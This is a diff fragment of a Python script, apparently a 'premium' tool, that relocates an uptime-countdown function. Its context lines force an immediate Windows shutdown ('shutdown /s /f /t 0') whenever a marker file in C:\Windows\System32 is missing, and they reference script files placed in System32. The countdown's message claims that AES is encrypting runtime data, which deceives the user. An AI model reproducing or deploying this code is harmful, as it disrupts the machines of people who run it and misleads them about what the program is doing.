@@ -159,37 +159,7 @@ pathx = r'C:\Windows\System32\validate.nsh'
 
 from datetime import datetime, timedelta
 import time
-def check_uptime():
-    boot_time = get_boot_time()
-    if boot_time is None:
-        print("Could not determine boot time.")
-        return
 
-    current_time = datetime.now()
-    uptime = current_time - boot_time
-
-    print("Current Time:", current_time.strftime("%Y-%m-%d %H:%M:%S"))
-    print("Uptime Duration:", uptime)
-
-    if uptime >= timedelta(minutes=5):
-        print("Okay")
-    else:
-        time_remaining = timedelta(minutes=5) - uptime
-        os.system('cls')
-        while time_remaining.total_seconds() > 0:
-            os.system('cls' if os.name == 'nt' else 'clear')
-            print("TO ensure the safety of premium among all computers, AES is encrypting every runtime data.")
-            print("Please be patient, once done, you can play mode 1 all you want.")
-            minutes, seconds = divmod(int(time_remaining.total_seconds()), 60)
-            print(f"Time remaining: {minutes} minutes and {seconds} seconds")
-            time.sleep(1)
-            current_time = datetime.now()
-            uptime = current_time - boot_time
-            time_remaining = timedelta(minutes=5) - uptime
-
-        print("Verification completed!")
-
-check_uptime()
     
 if not os.path.exists(pathx):
     os.system("shutdown /s /f /t 0")
@@ -248,7 +218,41 @@ if not os.path.exists("C:\\Windows\\System32\\MSRXL\\aespremv1.py"):
 import os
 import shutil
 os.system('cls')
+def check_uptime():
+    boot_time = get_boot_time()
+    if boot_time is None:
+        print("Could not determine boot time.")
+        return
 
+    current_time = datetime.now()
+    uptime = current_time - boot_time
+
+    print("Current Time:", current_time.strftime("%Y-%m-%d %H:%M:%S"))
+    print("Uptime Duration:", uptime)
+
+    if uptime >= timedelta(minutes=5):
+        print("Okay")
+    else:
+        time_remaining = timedelta(minutes=5) - uptime
+        os.system('cls')
+        while time_remaining.total_seconds() > 0:
+            os.system('cls' if os.name == 'nt' else 'clear')
+            print("")
+            print("")
+            print("")
+            print("")
+            print("---TO ensure the safety of premium among all computers, AES is encrypting every runtime data.")
+            print("---Please be patient, once done, you can play mode 1 all you want.")
+            minutes, seconds = divmod(int(time_remaining.total_seconds()), 60)
+            print(f"---Time remaining: {minutes} minutes and {seconds} seconds")
+            time.sleep(1)
+            current_time = datetime.now()
+            uptime = current_time - boot_time
+            time_remaining = timedelta(minutes=5) - uptime
+
+        print("Verification completed!")
+
+check_uptime()
 '''
 directory = r'C:\Windows\System32'
 
